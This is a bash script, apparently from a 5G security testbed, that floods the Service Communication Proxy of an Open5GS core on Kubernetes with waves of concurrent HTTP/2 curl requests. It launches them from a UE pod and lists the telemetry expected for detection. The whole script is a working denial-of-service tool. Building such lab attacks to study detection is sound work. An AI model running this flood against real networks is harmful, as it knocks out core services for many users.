#!/usr/bin/env bash
# inject_sbi_flood_scp.sh
# ───────────────────────
# Injects an HTTP/2 SBI flood on the SCP by hammering its proxy endpoint
# with concurrent requests from inside the cluster.
#
# SCP (Service Communication Proxy) sits between ALL NF-to-NF SBI calls
# in the indirect communication model. Every AMF→NRF, SMF→PCF, AUSF→UDM
# request is routed through SCP. Overloading it cascades to the entire core.
#
# This simulates a central proxy exhaustion attack — one of the highest-impact
# single-point attacks on a 5G SBA architecture.
# Based on: 3GPP TR 33.926 §6.2 (SCP availability threats)
#
# Usage: ./inject_sbi_flood_scp.sh [concurrency] [duration_seconds]
# Default: 20 concurrent workers, 300 seconds

set -euo pipefail

CONCURRENCY=${1:-20}
DURATION=${2:-300}

# Dynamically resolve SCP ClusterIP — robust across cluster recreates
SCP_IP=$(kubectl get svc -n open5gs open5gs-scp-sbi \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")

if [[ -z "$SCP_IP" ]]; then
    echo "ERROR: Could not resolve SCP ClusterIP. Is the cluster running?"
    echo "  kubectl get svc -n open5gs open5gs-scp"
    exit 1
fi

SCP_SBI="http://${SCP_IP}:7777"
# NRF discovery via SCP — forces SCP to proxy the request to NRF,
# exercising the full SCP routing + forwarding path per request
ENDPOINT="${SCP_SBI}/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF"

echo "[scp-flood] Target:      ${ENDPOINT}"
echo "[scp-flood] Concurrency: ${CONCURRENCY} workers"
echo "[scp-flood] Duration:    ${DURATION}s"
echo "[scp-flood] Protocol:    HTTP/2 cleartext (h2c)"
echo "[scp-flood] Effect:      SCP proxy exhaustion — cascades to ALL inter-NF communication"
echo ""

# Find a pod inside the cluster to run from
UE_NS=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $1}')
UE_POD=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $2}')

if [[ -z "$UE_POD" ]]; then
    echo "ERROR: Could not find ueransim-ues pod"
    exit 1
fi
echo "[scp-flood] Running flood from pod: $UE_POD ($UE_NS)"

FLOOD_SCRIPT=$(cat <<'INNER'
#!/bin/sh
ENDPOINT="$1"
CONCURRENCY="$2"
DURATION="$3"

END_TIME=$(( $(date +%s) + DURATION ))
WAVE=0

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    WAVE=$(( WAVE + 1 ))
    echo "[wave $WAVE] ${REMAINING}s remaining — launching $CONCURRENCY requests..."

    i=0
    while [ $i -lt $CONCURRENCY ]; do
        curl -s --max-time 3 --http2-prior-knowledge \
            "$ENDPOINT" -o /dev/null 2>/dev/null &
        i=$(( i + 1 ))
    done
    wait
    sleep 1
done

echo "[scp-flood] Done — ran $WAVE waves over ${DURATION}s"
INNER
)

kubectl exec -n "$UE_NS" "$UE_POD" -- sh -c "$FLOOD_SCRIPT" -- "$ENDPOINT" "$CONCURRENCY" "$DURATION"

echo ""
echo "[scp-flood] Flood complete. Expected telemetry:"
echo "  - Prometheus: SCP cpu_rate + net_rx_rate spike"
echo "  - Prometheus: secondary spikes on NRF (proxied discovery requests)"
echo "  - Loki: flood of SCP proxy request logs; downstream NF timeout/error logs"
echo "  - Jaeger: explosion of SCP→NRF discovery spans"
